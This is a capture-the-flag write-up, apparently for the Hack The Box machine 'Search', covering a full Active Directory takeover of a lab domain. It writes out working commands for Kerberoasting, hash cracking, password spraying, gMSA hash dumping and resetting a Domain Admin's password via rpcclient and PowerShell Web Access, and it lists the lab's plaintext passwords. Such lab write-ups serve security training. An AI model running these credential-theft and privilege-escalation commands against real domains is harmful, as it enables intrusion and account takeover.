### Summary
1. A **Windows Domain Controller** machine where we don't get any access using conventional methods. The key to gaining our initial set of credentials is by inspecting *one of the images* on the website that turns out to have **credentials** for a user called `hope.sharp`
2. *Using this authenticated access,* we run a **Kerberoast** attack which gets us the hash of the `web_svc` account that we crack to get a password.
3. *When spraying this password across the domain users,* we find out that the password is also used by another user: `edgar.jacobs`.
4. Edgar's shared redirected folder was exposing his user profile which contained an interesting **Microsoft Excel** document called `Phishing_Attempt.xlsx`.
5. *When closely checking the contents of that document,* we find a *hidden* column which cannot be viewed because the document was protected.
6. Uploading the Excel workbook to **Google Sheets** does the trick and shows us the hidden column which turned out to be a set of passwords.
7. One of the passwords worked for a user called `sierra.frye` which had the permission to read the **GMSA** password of `BIR-ADFS-GMSA$`.
8. The account `BIR-ADFS-GMSA$` had a `WriteDACL` right on a **Domain Administrator** called `tristan.davies`.
9. We use a python script to retrieve the **NTLM** hash of `BIR-ADFS-GMSA$` and abuse his rights to reset the password of `tristan.davies` via **RPC.**
10. Another route that is a bit longer includes using the **PowerShell Web Access** enabled on the web server after cracking then importing into our browser a `.pfx` certificate found on the shared user profile of the `sierra.frye` user.

---

### Nmap
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-25 20:46:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-25T20:47:44
|_  start_date: N/A
```

We see standard Domain Controller ports (53, 88, 389 & 3269) and **IIS** on ports 80, 443 & 8172

Port 5985 wasn't open so that meant no **WinRM** for this box

### Stuff we tried but didn't work
1. **SMB** enumeration using anonymous, guest and null sessions.
2. **RPC** enumeration with `enum4linux-ng`.
3. **LDAP** enumeration with `ldapsearch` using anonymous authentication.
4. Collecting usernames from the website and trying them. We got 3 valid users. But none of them was **ASREPRoastable** or had a weak password.
5. Web Directory Bruteforcing. The only unique directory was `/staff` but we got access denied. We also did file bruteforcing with multiple extensions without much success.
6. Viewing the source code for the accessible web pages.
7. Checking for **Virtual Host Routing**.

All of those didn't yield any results. However..

### When you use a magnifying glass..
*when looking really close at one of the images on the website,* something is there!

![secret-image-small](secret-image-small.jpg)

The text was very small. so we had to open up the image in a new tab and zoom in to find what's written:

![secret-image-up-close](secret-image-up-close.jpg)

It said: **"Send password to Hope Sharp"** then **"IsolationIsKey?"**

### First set of credentials
*Earlier,* when extracted usernames from the website:

![website-users](website-users-2.jpg)

we used a python tool called `ADGenerator` [here](https://github.com/w0Tx/generate-ad-username) to generate a list of usernames based on their first and last names following common naming conventions:

- NameSurname
- Name.Surname
- NamSur (3letters of each)
- Nam.Sur
- NSurname
- N.Surname
- SurnameName
- Surname.Name
- SurnameN
- Surname.N

and we used a tool called `kerbrute` [here](https://github.com/ropnop/kerbrute) to enumerate which were valid users using the `userenum` module.

![kerbrute-userenum](kerbrute-userenum.jpg)

*From that,* we know that the username convention is **Name.Surname**

We went ahead and found the password **"IsolationIsKey?"** to work with **"Hope.Sharp"**

![auth-as-hope-sharp](auth-as-hope-sharp.jpg)

### The Awesomeness of BloodHound
*Since port 5985 isn't open,* we have no reason to check for **WinRM** capabilities. So we turn to using all the tools that don't require a foothold on the box.

We start with `BloodHound.py` [here](https://github.com/fox-it/BloodHound.py) to get an overview of the situation in the domain.

**Note:** it's recommended to set your **DNS** server in `/etc/resolv.conf` to the box's IP to make sure things go smoothly when using any of the tools we're about to use.

**Command:** `python3 bloodhound.py -d search.htb -dc research.search.htb -u hope.sharp -p 'IsolationIsKey?'`

![bloodhound-py](bloodhound-py.jpg)

*When checking the output of the* `ShortestPath to High Value Targets`, we see a **clear path** to owning the domain:

![clear-path-to-DA](clear-path-to-DA.jpg)

We would first have to make our way to any of users on the left within the `ITSEC` group.

*In another* `BloodHound` *query for kerberoastable accounts*, we find we can attack `WEB_SVC`:

![web-svc-kerberoastable](web-svc-kerberoastable.jpg)

**Command:** `python3 GetUserSPNs.py -debug -request -dc-ip 10.10.11.129 search.htb/hope.sharp:'IsolationIsKey?'`

![kerberoasted](kerberoasted.jpg)

And we crack the password using `john`

**Command:** `john web_svc_hash -w=/usr/share/wordlists/rockyou.txt`

![cracked-with-john](cracked-with-john.jpg)

The password was **"@3ONEmillionbaby"**

### Checking for Password Reuse
It has turned into a habit for me to spray any password I get on all possible users xD

I use `crackmapexec` with the `--users` flag to obtain a the full list of domain users.

**Command:** `crackmapexec smb 10.10.11.129 -u 'web_svc' -p '@3ONEmillionbaby' --users`

![cme-full-userlist](cme-full-userlist.jpg)

Piping the output to a round of `awk` and `sed` formats the output into a nice list.

We find out that another user had been user the same password **"@3ONEmillionbaby"**

![edgar-reusing](edgar-reusing.jpg)

### Enumerating SMB access for Edgar
We use `crackmapexec`'s `spider_plus` module to get a *nicely-formatted* **JSON** output for `edgar`'s share access.

**Command:** `crackmapexec smb 10.10.11.129 -u 'Edgar.Jacobs' -p '@3ONEmillionbaby' -M spider_plus`

We notice something interesting in the results:

![interesting-document-found](interesting-document-found.jpg)

we use `smbclient` to fetch the file:

![getting-the-sheet](getting-the-sheet.jpg)

*When looking into the second tab of the workbook,* we notice a hidden column: **C**

![hidden-column](hidden-column.jpg)

We won't be able to **unhide** this column unless we **unprotect** the sheet:

![unprotecting-sheet](unprotecting-sheet.jpg)

*We can, however,* use a trick of uploading the `xlsx` file to **Google Sheets** :D

![got-them-passwords](got-them-passwords.jpg)

**PROFIT! :D**

### Access as Sierra
*When using the obtained passwords throughout the domain,* we gain access to `seirra.frye`

![got-sierra](got-sierra.jpg)

and since `sierra` is a member of the `ITSEC` group, we're going to go for a full domain takeover!

![path-to-da](path-to-da.jpg)

### Reading the GMSA password & Resetting `tristan`'s password
We can obtain the **NTLM** hash of the **GMSA** `BIR-ADFS-GMSA$` with a **python** tool called `gMSADumper` [here](https://github.com/micahvandeusen/gMSADumper)

**Command:** `python3 gMSADumper/gMSADumper.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`

![got-gmsa-ntlm](got-gmsa-ntlm.jpg)

What's left is to reset the password for `tristan` which we can do through `rpcclient` using the `--pw-nt-hash` to pass the hash.

then following with the `setuserinfo2` command making sure our password satisfies the complexity requirements.

and we finish with **impacket**'s `wmiexec.py` get full shell access.

![got-tristan](got-tristan.jpg)

### Alternate Route: cracking the `.pfx` certificate on `sierra`'s share + using it for PowerShell web access
*If we take some time to check* `sierra` *profile,* we see a file called `staff.pfx` in the `/Downloads/Backups` folder:

![pfx-found](pfx-found.jpg)

Using `john`'s python script `pfx2john`, we can get a format that's crackable.

![cracked-pfx](cracked-pfx.jpg)

We can import these certificates into `firefox`

![firefox-cert-import](firefox-cert-import.jpg)

After importing the certificates, we can browse to `https://10.10.11.129/staff`

![powershell-web-access](powershell-web-access.jpg)

we get a nice web terminal after authenticating:

![powershell-web-terminal](powershell-web-terminal.jpg)

*In order to be able to run code as* `BIR-ADFS-GMSA`, we're going to do a couple of things:

1. Obtain the **GMSA** password as a secure string. This can be done with the below command:
`$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword`

2. Create a `PSCredential` object with both the **GMSA** username and the secure string.
`$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword`

3. Execute a password reset command using the created `PSCredential`:
```
$Script = {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)}`
Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
```

4. Create another `PSCredential` object but with `tristan`'s new password:
`$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`

5. Execute commands as `tristan` using the new credential object:
`Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}`

![tristan-web-access](tristan-web-access.jpg)